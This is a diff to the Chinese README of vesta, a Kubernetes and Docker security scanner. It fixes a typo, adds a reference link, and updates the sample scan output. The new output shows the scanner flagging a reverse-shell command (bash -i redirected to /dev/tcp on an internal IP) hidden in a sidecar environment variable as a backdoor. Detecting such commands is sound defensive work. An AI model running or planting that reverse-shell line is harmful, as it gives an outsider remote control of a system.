@@ -95,9 +95,9 @@ vesta同时也是一个灵活，方便的工具，能够在各种系统上运行
 | ✔         | Kubelet 10255 and Kubectl proxy                          | 10255 port 打开或 Kubectl proxy开启           | high/medium/ low          |                                                                                                  |
 | ✔         | Etcd configuration                                       | Etcd 安全配置检查                              | high/medium               |                                                                                                  |
 | ✔         | Sidecar configurations                                   | Sidecar 安全配置检查以及Env环境检查                  | critical/high/ medium/low |                                                                                                  |              
-| ✔         | Pod annotation                                           | Pod annotation 存在不安全配置                   | high/medium/ low/warning  |                                                                                                  |
+| ✔         | Pod annotation                                           | Pod annotation 存在不安全配置                   | high/medium/ low/warning  | [Ref](https://github.com/kvesta/vesta/wiki/Annotation-Checking-References)                       |
 | ✔         | DaemonSet                                                | DaemonSet存在不安全配置                         | critical/high/ medium/low |                                                                                                  |
-| ✔         | Backdoor                                                 | 检查k8s中是否有后面                              | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Backdoor-Detection)                                   |
+| ✔         | Backdoor                                                 | 检查k8s中是否有后门                              | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Backdoor-Detection)                                   |
 
 
 ## 编译并使用vesta
@@ -190,9 +190,9 @@ Detected 3 vulnerabilities
 4. 使用vesta检查Kubernetes的基线配置
 
 ```bash
-$./vesta analyze k8s
-
 2022/11/29 23:15:59 Start analysing
+2022/11/29 23:15:59 Geting docker server version
+2022/11/29 23:15:59 Geting kernel version
 
 Detected 4 vulnerabilities
 
@@ -207,6 +207,11 @@ Pods:
 |    |                                | sidecar name: vulntest |       | Token:Password123456           | Sidecar EnvFrom       | high     | Sidecar envFrom ConfigMap has  |
 |    |                                | env                            |                                |                       |          | found weak password:           |
 |    |                                |                                |                                |                       |          | 'Password123456'.              |
++    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
+|    |                                | sidecar name: sidecartest |    | MALWARE: bash -i >&            | Sidecar Env           | high     | Container 'sidecartest' finds  |
+|    |                                | env                            | /dev/tcp/10.0.0.1/8080 0>&1    |                       |          | high risk content(score:       |
+|    |                                |                                |                                |                       |          | 0.91 out of 1.0), which is a   |
+|    |                                |                                |                                |                       |          | suspect command backdoor.      |
 +----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
 |  2 | Name: vulntest2 | Namespace:   | sidecar name: vulntest2 |      | CAP_SYS_ADMIN                  | capabilities.add      | critical | There has a potential          |
 |    | default | Status: Running |    | capabilities                   |                                |                       |          | container escape in privileged |
